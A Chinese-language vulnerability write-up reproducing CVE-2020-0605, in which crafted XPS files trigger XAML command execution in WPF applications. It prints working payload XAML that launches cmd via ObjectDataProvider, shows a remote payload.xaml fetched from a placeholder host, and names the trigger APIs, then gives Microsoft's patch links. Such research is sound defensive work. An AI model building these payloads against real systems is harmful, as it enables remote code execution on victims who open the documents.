0X01 背景
=======

XPS 是一种使用 XML、开放打包约定标准来创建的电子文档，XPS 极大的提升了Windows操作系统电子文档的创建、共享、打印、查看和存档效率，Windows系统内置多种应用提供创建XPS文档的打印程序，允许用户创建、查看以及批注打印的电子文档，例如 Microsoft Office 允许将文档保存为XPS格式的文件，当基于WPF开发的文档程序浏览或打印恶意攻击者伪造XPS文档时会触发XAML执行系统命令来获取管理员权限，CVE-2020-0605 就是这样的一种潜在的攻击案例，接下来跟随笔者一步步揭开它的神秘面纱

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-900d60ec87512300cdc89a4ea94349472627f6dd.png)

0X02 复现
=======

笔者尝试复现了漏洞 CVE-2020-0605，本质上XPS文件是一组包含字体、图像以及文本内容的ZIP压缩包，默认的扩展名为\*.xps，首先创建一个XPS文件，重命名为zip扩展名，解压后编辑Document/1/Pages/1.fpage文件，在FixedPage（固定页码）标记处添加 xmlns:sd="clr-namespace:System.Diagnostics;assembly=System" ，然后在&lt;FixedPage.Resources&gt;标记内加上ObjectDataProvider对象的XAML代码，完整的Payload运行后如下图

```php
<FixedPage xmlns="http://schemas.microsoft.com/xps/2005/06" xmlns:sd="clr-namespace:System.Diagnostics;assembly=System" xmlns:x="http://schemas.microsoft.com/xps/2005/06/resourcedictionary-key" xml:lang="en-us" Width="672" Height="864">
    <FixedPage.Resources>
        <ObjectDataProvider MethodName="Start" x:Key="obj">
            <ObjectDataProvider.ObjectInstance>
                <sd:Process>
                    <sd:Process.StartInfo>
                        <sd:ProcessStartInfo Arguments="/c calc" FileName="cmd" />
                    </sd:Process.StartInfo>
                </sd:Process>
            </ObjectDataProvider.ObjectInstance>
        </ObjectDataProvider>
        <ResourceDictionary>
            <ImageBrush x:Key="b0" ViewportUnits="Absolute" TileMode="None" ViewboxUnits="Absolute" Viewbox="0,0,460,620" Viewport="0,0,222.58064516129,300" ImageSource="/Resources/31b5ebf2-c72c-4d3e-baf9-f1ef2532216a.jpg" />
        </ResourceDictionary>
    </FixedPage.Resources>
    <Canvas RenderTransform="1,0,0,1,48,48">
        <Glyphs OriginX="0" OriginY="13.3033333333333" FontRenderingEmSize="14" FontUri="/Resources/6a457906-dd11-45c7-af2e-70767fb01ace.ODTTF" UnicodeString="公众号：" Fill="#FF000000" />
        <Glyphs OriginX="56" OriginY="13.3033333333333" FontRenderingEmSize="14" FontUri="/Resources/fb0916f4-3aec-4fdc-a907-5b21a9781f69.ODTTF" UnicodeString="dotNet" Indices=",56" Fill="#FF000000" />
        <Glyphs OriginX="97.03" OriginY="13.3033333333333" FontRenderingEmSize="14" FontUri="/Resources/6a457906-dd11-45c7-af2e-70767fb01ace.ODTTF" UnicodeString="安全矩" Fill="#FF000000" />
        <Glyphs OriginX="139.03" OriginY="13.3033333333333" FontRenderingEmSize="14" FontUri="/Resources/8fe6cb39-0d3c-4f69-a415-5da54bc9e70d.ODTTF" UnicodeString="阵" Fill="#FF000000" />
        <Canvas RenderTransform="1,0,0,1,0,41.4133333333333">
            <Glyphs OriginX="0" OriginY="13.3033333333333" FontRenderingEmSize="14" FontUri="/Resources/6a457906-dd11-45c7-af2e-70767fb01ace.ODTTF" UnicodeString="网址：" Fill="#FF000000" />
            <Glyphs OriginX="42" OriginY="13.3033333333333" FontRenderingEmSize="14" FontUri="/Resources/fb0916f4-3aec-4fdc-a907-5b21a9781f69.ODTTF" UnicodeString="https://www.cnblogs.com/Ivan1ee/" Indices=";;;;;;;;,78;,78;,70;;;;;;;;;;;;;;;,48" Fill="#FF000000" /></Canvas>
        <Path Fill="{StaticResource b0}" RenderTransform="1,0,0,1,176.709677419355,82.8266666666667" Data="M0,0L222.58,0 222.58,300 0,300Z" />
    </Canvas>
</FixedPage>
```

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-0b6f20fd13b9023987fe59d4c6971983240624c7.png)

0X03 XPS介绍
==========

XPS文件浏览和打印需求通常使用在WPF开发领域， 全称为 XML Paper Specification，XPS 格式的一个重要特点是所有文档内容和静态资源都存储在一个文件内，文件存储结构和内容以及各个部分之间的关系如下图

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-e68455b6047fb93ae97b3bad24adb3cf942fbb7f.png)

3.1 Fixeddocumentsequense.fdseq 文件
----------------------------------

Fixeddocumentsequense.fdseq 文件是树的根，如下该文件包含了XPS文档列表信息，明显是一组XAML，我们知道XAML里的所有的标签对应的都是.NET里的对象，所以这里的子标签DocumentReference就是一个内置对象，它的Source属性指向FixedDocument，既可指定本地文件也可以加载远程文件 \*.xaml

```php
// 加载本地文件
<FixedDocumentSequence xmlns="http://schemas.microsoft.com/xps/2005/06">
    <DocumentReference Source="Documents/1/FixedDocument.fdoc" />
</FixedDocumentSequence>

// 加载远程文件
<FixedDocumentSequence xmlns="http://schemas.microsoft.com/xps/2005/06">
    <DocumentReference Source="http://ip/payload.xaml" />
</FixedDocumentSequence>
```

3.2 \[Content\_Type\].xml 文件
----------------------------

\[Content\_Type\].xml 包含XPS文档里文件扩展名和相应内容类型之间的映射关系，如下扩展名.fdoc 对应fixeddocoument，在WPF里表示打印固定文档

```php
<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
      <Default Extension="fdseq" ContentType="application/vnd.ms-package.xps-fixeddocumentsequence+xml" />
      <Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml" />
      <Default Extension="fdoc" ContentType="application/vnd.ms-package.xps-fixeddocument+xml" />
      <Default Extension="fpage" ContentType="application/vnd.ms-package.xps-fixedpage+xml" />
      <Default Extension="ODTTF" ContentType="application/vnd.ms-package.obfuscated-opentype" />
      <Default Extension="png" ContentType="image/png" />
</Types>
```

3.3 FixedDocument.fdoc 文件
-------------------------

Documentsm目录结构下的 FixedDocument.fdoc文件 包含PageContent对象页面内容的引用列表信息，PageContent标记的Source属性指向FixedPage

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-54992d4707da220addf8730f8939e347e7f4ad0b.png)

3.4 \*.fpage 文件
---------------

FixedPage包含页面呈现的所有可视元素内容，如&lt;Canvas&gt;这样的基础存储容器控件元素。另外页面使用的资源位于单独的元素 FixedPage.Resources 中，包含一组资源字典ResourceDictionary，XPS文档里所有的图片的索引信息将保存于此，关于资源字典可看《[.NET高级代码审计(第12课) Gadget之详解ObjectDataProvider](https://mp.weixin.qq.com/s/sHKR0zlW2CsphGAmv3_KVA)》

```php
<FixedPage xmlns="http://schemas.microsoft.com/xps/2005/06" xmlns:x="http://schemas.microsoft.com/xps/2005/06/resourcedictionary-key" xml:lang="en-us" Width="672" Height="864">
    <FixedPage.Resources>
        <ResourceDictionary>
            <ImageBrush x:Key="b0" ViewportUnits="Absolute" TileMode="None" ViewboxUnits="Absolute" Viewbox="0,0,460,620" Viewport="0,0,222.58064516129,300" ImageSource="/Resources/31b5ebf2-c72c-4d3e-baf9-f1ef2532216a.jpg" />
        </ResourceDictionary>
    </FixedPage.Resources>
    <Canvas RenderTransform="1,0,0,1,48,48">
        <Glyphs OriginX="0" OriginY="13.3033333333333" FontRenderingEmSize="14" FontUri="/Resources/6a457906-dd11-45c7-af2e-70767fb01ace.ODTTF" UnicodeString="公众号：" Fill="#FF000000" />
        <Glyphs OriginX="56" OriginY="13.3033333333333" FontRenderingEmSize="14" FontUri="/Resources/fb0916f4-3aec-4fdc-a907-5b21a9781f69.ODTTF" UnicodeString="dotNet" Indices=",56" Fill="#FF000000" />
        <Glyphs OriginX="97.03" OriginY="13.3033333333333" FontRenderingEmSize="14" FontUri="/Resources/6a457906-dd11-45c7-af2e-70767fb01ace.ODTTF" UnicodeString="安全矩" Fill="#FF000000" />
        <Glyphs OriginX="139.03" OriginY="13.3033333333333" FontRenderingEmSize="14" FontUri="/Resources/8fe6cb39-0d3c-4f69-a415-5da54bc9e70d.ODTTF" UnicodeString="阵" Fill="#FF000000" />
        <Canvas RenderTransform="1,0,0,1,0,41.4133333333333">
            <Glyphs OriginX="0" OriginY="13.3033333333333" FontRenderingEmSize="14" FontUri="/Resources/6a457906-dd11-45c7-af2e-70767fb01ace.ODTTF" UnicodeString="网址：" Fill="#FF000000" />
            <Glyphs OriginX="42" OriginY="13.3033333333333" FontRenderingEmSize="14" FontUri="/Resources/fb0916f4-3aec-4fdc-a907-5b21a9781f69.ODTTF" UnicodeString="https://www.cnblogs.com/Ivan1ee/" Indices=";;;;;;;;,78;,78;,70;;;;;;;;;;;;;;;,48" Fill="#FF000000" />
        </Canvas>
        <Path Fill="{StaticResource b0}" RenderTransform="1,0,0,1,176.709677419355,82.8266666666667" Data="M0,0L222.58,0 222.58,300 0,300Z" />
    </Canvas>
</FixedPage>
```

3.5 \*.rels 文件
--------------

rels目录结构下的 \*.fpage.rels文件保存了资源之间的关联关系，文件有引用的页面资源，例如字体和图片

```php
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
    <Relationship Type="http://schemas.microsoft.com/xps/2005/06/required-resource" Target="../../../Resources/6a457906-dd11-45c7-af2e-70767fb01ace.ODTTF" Id="R780893b90a3c46d5" />
    <Relationship Type="http://schemas.microsoft.com/xps/2005/06/required-resource" Target="../../../Resources/fb0916f4-3aec-4fdc-a907-5b21a9781f69.ODTTF" Id="Ref7978b675f742f0" />
    <Relationship Type="http://schemas.microsoft.com/xps/2005/06/required-resource" Target="../../../Resources/8fe6cb39-0d3c-4f69-a415-5da54bc9e70d.ODTTF" Id="R21ff693614c74aa0" />
    <Relationship Type="http://schemas.microsoft.com/xps/2005/06/required-resource" Target="../../../Resources/31b5ebf2-c72c-4d3e-baf9-f1ef2532216a.jpg" Id="R82b82d7ed6b44a8b" />
</Relationships>
```

0X04 XPS用法
==========

WPF提供DocumentViewer容器加载FixedDocument，如下XAML 在固定页码标签放置两个TextBlock文本块填入字符串，Image标签引入图片所在的物理路径，渲染预览如下图

```php
<DocumentViewer HorizontalAlignment="Left" Margin="108,21,0,0" VerticalAlignment="Top">
        <FixedDocument>
            <PageContent>
                <FixedPage Width="672" Height="864">
                    <StackPanel Margin="48">
                        <TextBlock  FontSize="18" Width="576" TextWrapping="Wrap">
                            公众号：dotNet安全矩阵
                        </TextBlock>
                        <TextBlock  FontSize="14" Width="576" TextWrapping="Wrap" Margin="0,25,0,0">
                            网址：https://www.cnblogs.com/Ivan1ee/
                        </TextBlock>
                        <Image Margin="0,25,0,0" Source="d:\\zsxq.jpg" Width="300" Height="300"/>
                    </StackPanel>
                </FixedPage>
            </PageContent>
        </FixedDocument>
    </DocumentViewer>
```

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-38b1ac7b4d4214e720b51dc47b9d6ad9d7c3032f.png)

除了界面UI创建XPS加载显示外，也支持以编程的方式创建一个XPS文件，将上述提到的XAML文件中FixedDocument标记所有内容保存到 testFixed.xaml，程序通过XamlReader.Load方法解析XAML生成testFixedPage.xps

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-63a40eec800db22af85388ad3625654bdcb73aff.png)

第2小节提到XPS文件本身就是一个zip压缩包，将生成的testFixedPage.xps文件重命名为testFixedPage.zip，可见目录和文件结构如下

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-9253321262fc7719099089295c2ae7ddc33564a4.png)

0X05 攻击面
========

5.1 FixedDocumentSequence远程加载恶意载荷
---------------------------------

编辑根目录下的 FixedDocumentSequence.fdseq 文件，DocumentReference标记的Source属性指向远程xaml文件，笔者在本地用python启动了一个简易的web服务，在web目录下放置payload.xaml，当漏洞被触发时web服务会接收到来自外部的HTTP请求，如下图

```php
<FixedDocumentSequence xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation">
    <DocumentReference Source="http://127.0.0.1:8080/payload.xaml" />
</FixedDocumentSequence>
```

Payload.xaml

```php
<ResourceDictionary xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
 xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
 xmlns:System="clr-namespace:System;assembly=mscorlib"
 xmlns:Diag="clr-namespace:System.Diagnostics;assembly=system">
 <ObjectDataProvider x:Key="LaunchCalc" ObjectType="{x:Type Diag:Process}" MethodName="Start">
     <ObjectDataProvider.MethodParameters>
         <System:String>cmd</System:String>
         <System:String>/c winver</System:String>
     </ObjectDataProvider.MethodParameters>
 </ObjectDataProvider>
</ResourceDictionary>
```

5.2 FixedPage本地加载恶意载荷
---------------------

支持本地加载资源字典里的Payload，编辑 Documents/1/Pages/1.fpage 在&lt;FixedPage.Resources&gt;标记内注入 ObjectDataProvider对象

```php
<FixedPage.Resources>
    <ObjectDataProvider MethodName="Start" x:Key="obj">
            <ObjectDataProvider.ObjectInstance>
                <sd:Process>
                    <sd:Process.StartInfo>
                        <sd:ProcessStartInfo Arguments="/c calc" FileName="cmd" />
                    </sd:Process.StartInfo>
                </sd:Process>
            </ObjectDataProvider.ObjectInstance>
    </ObjectDataProvider>
    <ResourceDictionary>
        <ImageBrush x:Key="b0" ViewportUnits="Absolute" TileMode="None" ViewboxUnits="Absolute" Viewbox="0,0,756.481539065631,756.161538414588" Viewport="0,0,300,299.873096446701" ImageSource="/Resources/c43915ba-325a-4837-b320-23ab872e0814.png" />
    </ResourceDictionary>
</FixedPage.Resources>
```

5.3 PrintQueue.AddJob 触发点
-------------------------

PrintQueue 类表示一台打印机以及与其关联的输出作业队列， 允许对服务器的打印作业进行高级管理， AddJob 方法用于将新的打印作业插入队列。添加任务打印文档验证内容和进度通知时可触发此漏洞请求远程的xaml文件

```php
XPSDemo.App.Current.Dispatcher.Invoke((Action)(() =>
            {
                PrintQueue defaultPrintQueue = LocalPrintServer.GetDefaultPrintQueue();
                PrintSystemJobInfo xpsPrintJob = defaultPrintQueue.AddJob("test", @"createxps.xps", false);
            }
));
```

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-65ce2c485c49b54f0abe0c2b2949d652827349e8.png)

5.4 XpsDocument.GetFixedDocumentSequence 触发点
--------------------------------------------

WPF里程序初始化打印对话框显示文档内容时可触发漏洞，将XPS文件加载到内存并在DocumentViewer容器中显示，如下代码提供GetFixedDocumentSequence()方法返回文档根元素的引用

```php
XPSDemo.App.Current.Dispatcher.Invoke((Action)(() =>
            {
                XpsDocument myDoc = new XpsDocument(@"createxps.xps", FileAccess.Read);
                docView1.Document = myDoc.GetFixedDocumentSequence();
            }
));
```

从调用栈能清晰看到 XpsDocument.GetFixedDocumentSequence()方法调用后进入一个内部实现的代理类XamlReaderProxy的Load方法，在Load方法里最终调用XamlReader.Load，该方法和XamlReader.Parse一样可以解析运行XAML代码，本质上XamlReader.Parse方法底层也是调用了XamlReader.Load实现文本解析。如下图

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-b18e091d644dbba1bce05454b7fcf2a02e2cfbfa.png)

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-a587a4da9ebe2e529ffcfdfdc7d1836b16b39e9c.png)

0X06 修复
=======

微软为此漏洞分配 CVE-2020-0605 ，有关补丁信息参考 <https://support.microsoft.com/help/4552926>，微软也为不同的操作系统和.NET FrameWork版本提供了不同的修复补丁，具体信息参考MSRC : <https://msrc.microsoft.com/update-guide/vulnerability/CVE-2020-0605>

0X07 结语
=======

XPS 文件在Windows操作系统中可使用 XPS Viewer打开，但是由于XPS Viewer 应用程序不使用 WPF 来显示 XPS 文件，因此不受该漏洞影响。但需要说明的是 Microsoft 开发的Exchange、SharePoint 或其他应用预览XPS文档时也许会触发此类攻击利用的实践场景。欢迎对.NET安全关注和关心的同学加入dotNet安全矩阵，在这里能遇到有情有义的小伙伴，大家聚在一起做一件有意义的事。